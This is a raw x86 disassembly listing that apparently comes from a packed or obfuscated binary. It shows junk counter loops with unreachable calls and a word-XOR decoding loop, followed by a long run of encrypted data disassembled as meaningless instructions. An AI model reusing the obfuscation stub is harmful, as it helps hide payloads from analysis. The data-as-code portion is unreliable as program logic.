  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x43375b,0x0
  410338:	mov    ecx,DWORD PTR ds:0x43375b
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x43375b,ecx
  410345:	cmp    DWORD PTR ds:0x43375b,0x25
  41034c:	jne    0x410362
  410352:	push   0x4338af
  410357:	push   0x4338ef
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x43375b,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43379f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433813,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433813
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433813,ecx
  41038f:	cmp    DWORD PTR ds:0x433813,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4337e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433813,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433813
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433813,ecx
  4103c8:	cmp    DWORD PTR ds:0x433813,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43375f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433757,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433757
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433757,esi
  4103ff:	cmp    DWORD PTR ds:0x433757,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433757,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0xbf,al
  41049c:	mov    cl,0xa4
  41049e:	mov    al,ds:0x7e7eb0dc
  4104a3:	scas   eax,DWORD PTR es:[edi]
  4104a4:	jl     0x410524
  4104a6:	jle    0x41044c
  4104a8:	cmp    al,0x4d
  4104aa:	push   0xfc53b499
  4104af:	out    dx,eax
  4104b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104b1:	and    esp,0x61
  4104b4:	push   cs
  4104b5:	push   edi
  4104b6:	and    DWORD PTR fs:[esi+edx*8+0x9],edx
  4104bb:	sub    eax,0x38a97474
  4104c0:	ret    
  4104c1:	aam    0xba
  4104c3:	push   ss
  4104c4:	sbb    al,0x71
  4104c6:	jmp    0x92d7:0xa171b325
  4104cd:	pop    ss
  4104ce:	test   DWORD PTR [eax+0x1b179bb],0x13dfa5e7
  4104d8:	inc    ebp
  4104d9:	pop    eax
  4104da:	wbinvd 
  4104dc:	loopne 0x4104aa
  4104de:	popf   
  4104df:	or     eax,DWORD PTR [eax-0x3c]
  4104e2:	push   esi
  4104e3:	mov    al,0x7a
  4104e5:	jb     0x410503
  4104e7:	in     eax,0x90
  4104e9:	stc    
  4104ea:	mov    esp,0x293359de
  4104ef:	icebp  
  4104f0:	std    
  4104f1:	arpl   di,bp
  4104f3:	mov    WORD PTR [edx-0x45db058b],?
  4104f9:	push   ss
  4104fa:	mov    ebx,0x19117551
  4104ff:	pop    edi
  410500:	ret    
  410501:	loopne 0x410536
  410503:	push   0x80b04cf
  410508:	add    al,0xf
  41050a:	add    DWORD PTR [ebp-0x34],esi
  41050d:	xor    al,0x2c
  41050f:	rcr    cl,1
  410511:	xor    cl,BYTE PTR [ecx-0x7c]
  410514:	or     al,0xf
  410516:	(bad)  
  410517:	xor    al,0xb2
  410519:	pop    eax
  41051a:	and    DWORD PTR [eax-0x4ec874a0],0xfffffffa
  410521:	inc    esp
  410522:	loopne 0x41054c
  410524:	cmp    al,0xc5
  410526:	cmp    ecx,DWORD PTR [edx-0x57]
  410529:	xchg   esi,eax
  41052a:	in     eax,0xb7
  41052c:	add    DWORD PTR [ebx+0x47],eax
  41052f:	jg     0x410505
  410531:	sub    edx,esp
  410533:	out    dx,al
  410534:	frstor [edx]
  410536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410537:	mov    ds:0x57a5ff69,eax
  41053c:	js     0x4104fb
  41053e:	fmul   st(7),st
  410540:	inc    edx
  410541:	call   0x8d92:0x86c92620
  410548:	sbb    dl,ah
  41054a:	sbb    cl,BYTE PTR [edi+eax*2-0x3c9f5f71]
  410551:	loopne 0x410568
  410553:	lea    esi,[eax+0x5704fd6]
  410559:	push   ebp
  41055a:	mov    DWORD PTR [edi],ebp
  41055c:	cmp    cl,cl
  41055e:	ins    BYTE PTR es:[edi],dx
  41055f:	or     eax,0x25949efe
  410564:	dec    esi
  410565:	test   DWORD PTR [edi],eax
  410567:	cmp    eax,0xc09458d1
  41056c:	xor    DWORD PTR ds:0xa0fbd563,edi
  410572:	leave  
  410573:	and    eax,0xb3c494de
  410578:	xor    ecx,DWORD PTR [ecx+0x6e9061d9]
  41057e:	xchg   edx,eax
  41057f:	mov    al,ds:0x9dc3bc3c
  410584:	pop    edx
  410585:	jbe    0x410518
  410587:	jl     0x410560
  410589:	add    DWORD PTR [esi+0x66ef4a18],edx
  41058f:	rcr    DWORD PTR [ebx-0x45b970a],0xfd
  410596:	adc    DWORD PTR ds:0xed6cebd0,0xfffffff9
  41059d:	popf   
  41059e:	sub    DWORD PTR [ebx+0x3f],ebx
  4105a1:	and    ebp,ebx
  4105a3:	(bad)  
  4105a4:	stc    
  4105a5:	repnz and ch,BYTE PTR [esi]
  4105a8:	sub    eax,0xd8d75792
  4105ad:	cmp    eax,0x53db7f7f
  4105b2:	mov    ds:0xb463d82f,al
  4105b7:	pusha  
  4105b8:	adc    eax,0x38d29225
  4105bd:	push   edi
  4105be:	or     al,0x80
  4105c0:	test   al,0x4e
  4105c2:	lock dec bp
  4105c5:	lahf   
  4105c6:	dec    edx
  4105c7:	popf   
  4105c8:	and    ch,BYTE PTR [ebx]
  4105ca:	xchg   bp,ax
  4105cc:	addr16 jp 0x410591
  4105cf:	clc    
  4105d0:	inc    ebp
  4105d1:	enter  0xbc31,0xd1
  4105d5:	xor    BYTE PTR [ecx],bh
  4105d7:	cmp    al,0x48
  4105d9:	cmp    al,0xf1
  4105db:	lock or DWORD PTR [edi],esi
  4105de:	and    eax,0xb92e5e33
  4105e3:	xchg   ecx,eax
  4105e4:	sub    DWORD PTR [eax+0x3b],edi
  4105e7:	jmp    0x41059c
  4105e9:	push   ecx
  4105ea:	repnz or BYTE PTR [esi+0x31a63caa],0xda
  4105f2:	xlat   BYTE PTR ds:[ebx]
  4105f3:	inc    eax
  4105f4:	sub    al,0xf6
  4105f6:	std    
  4105f7:	mov    esi,ebx
  4105f9:	inc    eax
  4105fa:	or     eax,0xe2d3edc8
  4105ff:	out    dx,al
  410600:	mov    dh,0x23
  410602:	jae    0x41058f
  410604:	mov    ah,dh
  410606:	mov    edx,0xe48ab0f5
  41060b:	repz jmp 0xc4a8:0x33e9a63f
  410613:	dec    BYTE PTR [ebx]
  410615:	js     0x410669
  410617:	retf   
  410618:	push   0xeee8b3fb
  41061d:	es aaa 
  41061f:	dec    esp
  410620:	mov    bl,0x85
  410622:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410623:	dec    eax
  410624:	pop    eax
  410625:	sbb    al,0x1e
  410627:	dec    esi
  410628:	mov    cl,0x63
  41062a:	xor    ebp,eax
  41062c:	sbb    DWORD PTR [ebp-0x4c],0x5
  410630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410631:	add    BYTE PTR [edi+ecx*2+0x44],0x62
  410636:	mov    ebp,0x18ad0231
  41063b:	cmp    BYTE PTR [esi],dl
  41063d:	push   0x22
  41063f:	pop    ebx
  410640:	leave  
  410641:	cld    
  410642:	jg     0x41063f
  410644:	jmp    0x41069b
  410646:	xor    edi,DWORD PTR ds:0x98285bba
  41064c:	aas    
  41064d:	inc    ebp
  41064e:	(bad)  
  41064f:	xor    eax,0x656e6765
  410654:	pop    es
  410655:	sahf   
  410656:	data16 test BYTE PTR [edi+ebp*4],al
  41065a:	sub    eax,esp
  41065c:	jg     0x4106ae
  41065e:	inc    BYTE PTR [eax-0x6fd1a814]
  410664:	mov    WORD PTR [ecx+edi*2+0x4bbc7756],ss
  41066b:	or     al,BYTE PTR [bp+si-0x6889]
  410670:	sbb    eax,0xf70e9213
  410675:	loope  0x41064b
  410677:	lock mov gs,esp
  41067a:	pop    ebx
  41067b:	pop    esi
  41067c:	cmp    DWORD PTR ds:0x7f35455c,ecx
  410682:	out    dx,eax
  410683:	push   0xffffffd9
  410685:	daa    
  410686:	pop    ebp
  410687:	xor    eax,0x38358daf
  41068c:	sar    bl,1
  41068e:	pop    ds
  41068f:	fisttp WORD PTR [esi]
  410691:	xchg   DWORD PTR [esi+0x2c9dcd63],ecx
  410697:	sub    BYTE PTR [ebx+eax*2],dl
  41069a:	popa   
  41069b:	sub    eax,0x4e0800bc
  4106a0:	out    0xc5,eax
  4106a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106a3:	(bad)  
  4106a4:	mov    dh,0x69
  4106a6:	jae    0x410637
  4106a8:	pusha  
  4106a9:	js     0x410711
  4106ab:	dec    ebx
  4106ac:	push   ds
  4106ad:	dec    ebp
  4106ae:	mov    al,ds:0x83040bf8
  4106b3:	jmp    0x41069f
  4106b5:	dec    ecx
  4106b6:	xchg   ebp,eax
  4106b7:	das    
  4106b8:	aad    0xd9
  4106ba:	je     0x410710
  4106bc:	repnz push esp
  4106be:	scas   al,BYTE PTR es:[edi]
  4106bf:	out    0xe9,al
  4106c1:	sub    eax,0x116cb4bb
  4106c6:	dec    edx
  4106c7:	test   BYTE PTR [edi+0x6c],dl
  4106ca:	fcomp  st(2)
  4106cc:	repnz mov eax,0x98b0b72c
  4106d2:	in     al,dx
  4106d3:	in     al,0x7b
  4106d5:	dec    eax
  4106d6:	arpl   WORD PTR [esi-0x2f0bbb6a],sp
  4106dc:	mov    ah,0x95
  4106de:	int    0x0
  4106e0:	cs inc esi
  4106e2:	ret    0x41ed
  4106e5:	lods   eax,DWORD PTR ds:[esi]
  4106e6:	pop    esp
  4106e7:	aad    0xea
  4106e9:	jp     0x410752
  4106eb:	add    al,0xdd
  4106ed:	push   eax
  4106ee:	push   esi
  4106ef:	hlt    
  4106f0:	outs   dx,DWORD PTR ds:[esi]
  4106f1:	add    al,0x2
  4106f3:	mov    dh,0xa4
  4106f5:	inc    esp
  4106f6:	aam    0x58
  4106f8:	jle    0x41076d
  4106fa:	inc    edi
  4106fb:	pop    ss
  4106fc:	jae    0x4106ce
  4106fe:	cmp    DWORD PTR [esi+0x6c],eax
  410701:	mov    edx,DWORD PTR [ecx]
  410703:	hlt    
  410704:	popf   
  410705:	xchg   esp,eax
  410706:	icebp  
  410707:	inc    eax
  410708:	dec    edi
  410709:	jp     0x4106c1
  41070b:	pop    ecx
  41070c:	or     DWORD PTR [esi+ebp*1],0x377f7130
  410713:	test   ecx,ebx
  410715:	push   esp
  410716:	outs   dx,BYTE PTR ds:[esi]
  410717:	sahf   
  410718:	jmp    0xaeb2:0xa6833652
  41071f:	ret    0x5d3f
  410722:	mov    DWORD PTR [esp+ecx*2+0x6b6b093],ebx
  410729:	fwait
  41072a:	out    dx,eax
  41072b:	adc    al,0x89
  41072d:	mov    esp,0x9288acb5
  410732:	imul   esp,DWORD PTR [ebx+0x4686ae6d],0x2a3fd561
  41073c:	out    dx,eax
  41073d:	sbb    esi,DWORD PTR [edx-0x6e]
  410740:	adc    esp,DWORD PTR [esi+0x29]
  410743:	xchg   esp,eax
  410744:	add    edi,ebp
  410746:	(bad)  
  410747:	pushf  
  410748:	lahf   
  410749:	ja     0x4107ba
  41074b:	das    
  41074c:	lock aas 
  41074e:	pop    ebp
  41074f:	inc    edi
  410750:	jmp    DWORD PTR [edx+ebx*4-0x1f]
  410754:	imul   eax,DWORD PTR [esi+eiz*4+0x5],0xffffff8b
  410759:	inc    ebp
  41075a:	hlt    
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x70e20e29
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x4107a8
  41078c:	mov    ds:0xdeb01359,al
  410791:	fldenv [ebx+0x1]
  410794:	test   BYTE PTR [ebx+0x2e67cce9],bl
  41079a:	xchg   BYTE PTR [esi+0x6c8dfbe1],cl
  4107a0:	push   esp
  4107a1:	fistp  QWORD PTR [ebx-0x6ac7aa6d]
  4107a7:	cmp    BYTE PTR [eax+0x6e13397d],dh
  4107ad:	dec    eax
  4107ae:	fist   WORD PTR [eax-0x43]
  4107b1:	sbb    ecx,DWORD PTR [ecx]
  4107b3:	call   0xc427:0xb6a411f7
  4107ba:	cmp    al,BYTE PTR [ecx+0x1ffb221b]
  4107c0:	push   edx
  4107c1:	push   ecx
  4107c2:	add    DWORD PTR [esp+edx*1+0x5b],esi
  4107c6:	shl    BYTE PTR [eax],0x9c
  4107c9:	es loopne 0x410833
  4107cc:	pop    esp
  4107cd:	loope  0x410762
  4107cf:	or     ch,BYTE PTR [ebx+0x61ea57fd]
  4107d5:	repnz sar edx,0x60
  4107d9:	xlat   BYTE PTR ds:[ebx]
  4107da:	adc    eax,0xa44f52f1
  4107df:	xchg   esi,eax
  4107e0:	sub    al,0x99
  4107e2:	fnsave [eax]
  4107e4:	adc    eax,0xe9906317
  4107e9:	retf   
  4107ea:	cmp    esi,DWORD PTR [ecx+eax*1]
  4107ed:	xor    al,0x77
  4107ef:	mov    edi,0xe2c943a8
  4107f4:	(bad)  
  4107f6:	retf   0x1e0c
  4107f9:	ret    0xaca0
  4107fc:	sub    dl,BYTE PTR [ecx+0x3f]
  4107ff:	sbb    DWORD PTR [edx],ebp
  410801:	lds    esp,FWORD PTR gs:[ebx-0x5175d457]
  410808:	jg     0x41082e
  41080a:	adc    bl,BYTE PTR [esi-0x63]
  41080d:	inc    esi
  41080e:	or     ah,BYTE PTR [esi]
  410810:	and    al,0x17
  410812:	or     ch,dh
  410814:	mov    esp,0x9869015d
  410819:	fsub   DWORD PTR [ecx]
  41081b:	or     BYTE PTR [esi],0x78
  41081e:	mov    esi,0x2e31888a
  410823:	stos   DWORD PTR es:[edi],eax
  410824:	inc    eax
  410825:	pop    ds
  410826:	mov    ecx,DWORD PTR [edx]
  410828:	jp     0x41083f
  41082a:	sbb    DWORD PTR [ebp+ecx*4+0x5c],0x5a
  41082f:	push   eax
  410830:	inc    esp
  410831:	push   edi
  410832:	frstor [eax-0x469b8033]
  410838:	jno    0x4108b8
  41083a:	data16 into 
  41083c:	xchg   esi,eax
  41083d:	pop    edi
  41083e:	mov    ds:0x70433da1,al
  410843:	in     al,dx
  410844:	add    BYTE PTR [ebp+0x62192661],dh
  41084a:	sbb    esi,ebp
  41084c:	(bad)  
  41084d:	icebp  
  41084e:	sbb    al,0xcb
  410850:	push   ds
  410851:	and    DWORD PTR [edx+esi*4],eax
  410854:	push   es
  410855:	sub    eax,0xf4c53e6a
  41085a:	mov    ch,0xb7
  41085c:	pop    eax
  41085d:	ja     0x41083d
  41085f:	pop    ebx
  410860:	cli    
  410861:	outs   dx,DWORD PTR ds:[esi]
  410862:	scas   al,BYTE PTR es:[edi]
  410863:	scas   eax,DWORD PTR es:[edi]
  410864:	mov    DWORD PTR [ecx+0x366147dc],ebx
  41086a:	or     DWORD PTR [ebx],ebp
  41086c:	mov    dh,0x36
  41086e:	aad    0x33
  410870:	lods   al,BYTE PTR ds:[esi]
  410871:	push   ds
  410872:	in     al,dx
  410873:	xchg   edi,eax
  410874:	dec    edx
  410875:	cmp    al,0x98
  410877:	pop    ss
  410878:	sbb    al,0xa7
  41087a:	push   esp
  41087b:	out    dx,al
  41087c:	fisttp DWORD PTR [ecx]
  41087e:	inc    esp
  41087f:	sar    ah,1
  410881:	imul   ebp,DWORD PTR [esi+0x3ed7b63e],0xffffffe4
  410888:	inc    ebp
  410889:	call   0xb8839b1e
  41088e:	push   0x2f62bce9
  410893:	jbe    0x410890
  410895:	call   0x96a9:0x5b0497fc
  41089c:	push   ds
  41089d:	fwait
  41089e:	xchg   ebp,eax
  41089f:	or     eax,0x28b6245a
  4108a4:	mov    ebp,0x4bfe8131
  4108a9:	in     eax,0x9a
  4108ab:	push   edx
  4108ac:	mov    ebx,0xd5dc0d88
  4108b1:	jo     0x410846
  4108b3:	adc    DWORD PTR [edx+0x561880cc],eax
  4108b9:	lods   eax,DWORD PTR ds:[esi]
  4108ba:	push   ss
  4108bb:	cmp    DWORD PTR ss:[ecx+0x336670cf],edx
  4108c2:	add    bl,BYTE PTR [edi]
  4108c4:	pop    esi
  4108c5:	push   esp
  4108c6:	aam    0x7a
  4108c8:	sub    BYTE PTR [ebx+0xd3309d8],dl
  4108ce:	dec    edx
  4108cf:	dec    eax
  4108d0:	sahf   
  4108d1:	les    ebx,FWORD PTR [ebp+0x6c27d2bf]
  4108d7:	test   al,0xc9
  4108d9:	bound  edi,QWORD PTR [ebp+0xf70a2a0]
  4108df:	mov    esp,0x2c70d459
  4108e4:	ds dec esp
  4108e6:	adc    BYTE PTR [eax],dh
  4108e8:	mov    al,0x35
  4108ea:	dec    esp
  4108eb:	dec    ebx
  4108ec:	jmp    0x57e6030d
  4108f1:	(bad)  
  4108f3:	or     eax,0x7dd78a79
  4108f8:	icebp  
  4108f9:	add    DWORD PTR [ecx],esp
  4108fb:	jno    0x4108d4
  4108fd:	push   0xfffffff7
  4108ff:	pop    ss
  410900:	xor    eax,0x3773ede6
  410905:	mov    ch,0xc3
  410907:	loopne 0x4108fb
  410909:	gs jne 0x410983
  41090c:	ja     0x4108f3
  41090e:	push   ss
  41090f:	in     al,0x95
  410911:	mov    eax,0x38daeaf9
  410916:	push   cs
  410917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410918:	and    DWORD PTR [ecx],edx
  41091a:	inc    esp
  41091b:	push   0xffffffec
  41091d:	lahf   
  41091e:	in     eax,0xb5
  410920:	fld    DWORD PTR [eax+0x18ac9934]
  410926:	lods   eax,DWORD PTR ds:[esi]
  410927:	jmp    0x77e70f77
  41092c:	mov    eax,ds:0x57b29498
  410931:	jnp    0x410905
  410933:	clc    
  410934:	mov    BYTE PTR [edx-0x3e],dl
  410937:	xchg   esp,eax
  410938:	xchg   ecx,eax
  410939:	les    ebx,FWORD PTR [eax]
  41093b:	pop    ds
  41093c:	mov    esi,0x5fefbf26
  410941:	and    esi,DWORD PTR [ebp+0x5300e0fe]
  410947:	cmp    DWORD PTR [eax+0xe4b3fc1],0xffffffac
  41094e:	lods   al,BYTE PTR ds:[esi]
  41094f:	jnp    0x4108f8
  410951:	enter  0xd882,0xfd
  410955:	rcr    BYTE PTR [edx-0x20],0x78
  410959:	xchg   edx,eax
  41095a:	cld    
  41095b:	(bad)  
  41095c:	out    dx,eax
  41095d:	test   eax,0x53dd3478
  410962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410963:	pop    ebx
  410964:	mov    ebx,0xca46febf
  410969:	xor    eax,0x7288a24b
  41096e:	loopne 0x4108fe
  410970:	in     al,dx
  410971:	fsubr  st,st(5)
  410973:	imul   eax,edx,0xd2c5e340
  410979:	cmc    
  41097a:	retf   
  41097b:	cmp    BYTE PTR [eax+0x6687ba5b],dl
  410981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410982:	dec    ecx
  410983:	push   esi
  410984:	mov    bh,0x4a
  410986:	xor    al,bh
  410988:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410989:	inc    ebp
  41098a:	or     DWORD PTR ds:0xa0566198,ebp
  410990:	ret    
  410991:	leave  
  410992:	enter  0xf525,0x15
  410996:	add    al,0x7e
  410998:	fbld   TBYTE PTR ds:0x65ba28bc
  41099e:	ins    BYTE PTR es:[edi],dx
  41099f:	inc    eax
  4109a0:	jp     0x4109fa
  4109a2:	cmc    
  4109a3:	pop    ebx
  4109a4:	dec    esp
  4109a6:	out    0x58,eax
  4109a8:	sti    
  4109a9:	or     esi,edi
  4109ab:	nop
  4109ac:	int    0xfa
  4109ae:	add    al,0xdf
  4109b0:	xor    eax,0xe17b2cc3
  4109b5:	mov    ebp,0xe6021e41
  4109ba:	mov    ch,dl
  4109bc:	cld    
  4109bd:	jl     0x4109e6
  4109bf:	cmc    
  4109c0:	xor    al,0x43
  4109c2:	lahf   
  4109c3:	mov    eax,ds:0xd07fb98d
  4109c8:	popf   
  4109c9:	cmp    ecx,edi
  4109cb:	and    al,0x6
  4109cd:	jns    0x4109cd
  4109cf:	pop    esp
  4109d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109d1:	sbb    eax,0xaa45fa07
  4109d6:	adc    dl,al
  4109d8:	push   edx
  4109d9:	mov    eax,ds:0x804cefb8
  4109de:	cmp    DWORD PTR [ecx],ebp
  4109e0:	jge    0x410a09
  4109e2:	mov    ebp,0x203d5cdf
  4109e7:	outs   dx,DWORD PTR ds:[esi]
  4109e8:	lea    ebx,[esi+eiz*1+0x4a80e0b7]
  4109ef:	ret    0xb24a
  4109f2:	enter  0x8a3d,0x77
  4109f6:	xor    DWORD PTR [ebx-0x56],ecx
  4109f9:	push   eax
  4109fa:	sbb    BYTE PTR [ecx+0x50],al
  4109fd:	sub    esp,eax
  4109ff:	adc    dh,ah
  410a01:	inc    eax
  410a02:	pop    ss
  410a03:	out    dx,al
  410a04:	push   ds
  410a05:	jmp    0xeb2526f1
  410a0a:	dec    ebp
  410a0b:	inc    edx
  410a0c:	xor    DWORD PTR [ebx+ebp*4+0x1c],ebx
  410a10:	mov    al,ds:0xa221bc93
  410a15:	jns    0x410a8c
  410a17:	pop    es
  410a18:	mov    eax,ds:0x710d0c40
  410a1d:	ins    BYTE PTR es:[edi],dx
  410a1e:	sbb    DWORD PTR [ebp+0x2268225a],eax
  410a24:	in     eax,0x3e
  410a26:	xchg   edi,ebx
  410a28:	jge    0x410a09
  410a2a:	aaa    
  410a2b:	std    
  410a2c:	cld    
  410a2d:	and    ecx,DWORD PTR [ebx+0x29]
  410a30:	es loopne 0x410a59
  410a33:	jl     0x410a03
  410a35:	scas   al,BYTE PTR es:[edi]
  410a36:	nop
  410a37:	cdq    
  410a38:	pop    edx
  410a39:	sub    al,0x2e
  410a3b:	or     al,0x3
  410a3d:	(bad)  
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	ret    0x174
  410a52:	cmc    
  410a53:	mov    edx,0xaf7e7ebd
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a3a
  410a5c:	adc    edi,DWORD PTR [ebp-0x2c]
  410a5f:	icebp  
  410a60:	out    0xe,eax
  410a62:	mov    al,0xbd
  410a64:	mov    WORD PTR [ecx],cs
  410a66:	data16 aas 
  410a68:	push   ds
  410a69:	sbb    ebp,esp
  410a6b:	gs (bad) 
  410a6d:	sti    
  410a6e:	out    0xd5,eax
  410a70:	mov    esi,0x9c273427
  410a75:	push   0x68
  410a77:	test   BYTE PTR es:[eax],ah
  410a7a:	call   0x19557d97
  410a7f:	dec    eax
  410a80:	sahf   
  410a81:	cmc    
  410a82:	popf   
  410a83:	push   es
  410a84:	jns    0x410a7f
  410a86:	clc    
  410a87:	fisttp DWORD PTR [eax+0x5c6f84e8]
  410a8d:	out    dx,eax
  410a8e:	xlat   BYTE PTR ds:[ebx]
  410a8f:	or     DWORD PTR [ecx+0x495b3ba3],eax
  410a95:	dec    esi
  410a96:	mov    edx,0x25e5c4b4
  410a9b:	add    DWORD PTR [esi],eax
  410a9d:	pop    es
  410a9e:	sbb    dl,BYTE PTR [edi*1-0x1e6ca67]
  410aa5:	mov    eax,ds:0x95edae2f
  410aaa:	xchg   esi,eax
  410aab:	jg     0x410a5e
  410aad:	inc    ecx
  410aae:	dec    esp
  410aaf:	adc    DWORD PTR [ebx+0x21],edx
  410ab2:	jecxz  0x410a4c
  410ab4:	push   edi
  410ab5:	in     al,0x4a
  410ab7:	imul   edi,DWORD PTR [eax-0x1446cb54],0x258ffdd9
  410ac1:	popa   
  410ac2:	sbb    eax,0x7e69d906
  410ac7:	mov    dl,0x1f
  410ac9:	xor    eax,0x93ecbdbf
  410ace:	add    BYTE PTR [ebx-0x23],bl
  410ad1:	(bad)  
  410ad2:	lea    edx,[edx+0x13]
  410ad5:	xchg   esi,eax
  410ad6:	adc    ebp,DWORD PTR [esi+0x43f5f6a0]
  410adc:	je     0x410a91
  410ade:	mov    cl,0xfe
  410ae0:	and    al,0xc3
  410ae2:	out    dx,eax
  410ae3:	xor    edx,0x66
  410ae6:	mov    ebp,0x2a55beab
  410aeb:	popf   
  410aec:	and    eax,0x43e0da41
  410af1:	push   esi
  410af2:	inc    edx
  410af3:	mov    esi,0x4c34809d
  410af8:	dec    esi
  410af9:	pop    esp
  410afa:	xor    al,0x48
  410afc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410afd:	ror    DWORD PTR [edx],1
  410aff:	jmp    0x79ee4399
  410b04:	jmp    0xbb208593
  410b09:	fstp   QWORD PTR [ecx+0xd974ad1]
  410b0f:	xchg   edi,eax
  410b10:	cmp    BYTE PTR [edx-0xfd5d234],al
  410b16:	scas   al,BYTE PTR es:[edi]
  410b17:	pop    eax
  410b18:	mov    ds:0x8ba6e1ed,eax
  410b1d:	or     BYTE PTR [edi],0xe1
  410b20:	mov    dh,0x4d
  410b22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b23:	pop    ecx
  410b24:	nop
  410b25:	cdq    
  410b26:	ins    DWORD PTR es:[edi],dx
  410b27:	add    ecx,DWORD PTR [ecx+0x21]
  410b2a:	sub    BYTE PTR [eax+eax*4+0x55],0xcd
  410b2f:	outs   dx,BYTE PTR ds:[esi]
  410b30:	rcl    DWORD PTR [ecx-0x5b63c67d],0xb8
  410b37:	cs jne 0x410ba3
  410b3a:	int3   
  410b3b:	(bad)
  410b3e:	cwde   
  410b3f:	jmp    0x6e14bc8c
  410b44:	jb     0x410b3e
  410b46:	jae    0x410b13
  410b48:	push   es
  410b49:	adc    BYTE PTR [ebx-0x26614821],al
  410b4f:	ret    0xe36f
  410b52:	push   eax
  410b53:	lods   eax,DWORD PTR ds:[esi]
  410b54:	adc    eax,0xa817ac6e
  410b59:	dec    esp
  410b5a:	ss out 0x50,eax
  410b5d:	mov    cl,dh
  410b5f:	push   0xe
  410b61:	cmp    ebp,edi
  410b63:	dec    edi
  410b64:	push   esi
  410b65:	or     BYTE PTR [edx],dh
  410b67:	int3   
  410b68:	xor    eax,ebx
  410b6a:	in     al,0x69
  410b6c:	inc    esp
  410b6d:	aaa    
  410b6e:	mov    bh,0x77
  410b70:	lea    ebx,[edi]
  410b72:	or     edi,DWORD PTR [ebx+edi*4]
  410b75:	xor    eax,0x38816ba4
  410b7a:	dec    eax
  410b7b:	aam    0xee
  410b7d:	(bad)  
  410b7e:	fidivr WORD PTR [ecx]
  410b80:	ret    0x19b9
  410b83:	pop    edi
  410b84:	sub    dh,cl
  410b86:	jbe    0x410b53
  410b88:	mov    ebp,0x3a834885
  410b8d:	push   esp
  410b8e:	loope  0x410bff
  410b90:	or     DWORD PTR [edi],0x62d4dbdb
  410b96:	lods   eax,DWORD PTR ds:[esi]
  410b97:	pusha  
  410b98:	hlt    
  410b99:	fadd   st(4),st
  410b9b:	jmp    0xda5e:0x78427e55
  410ba2:	lock out dx,al
  410ba4:	loopne 0x410beb
  410ba6:	cli    
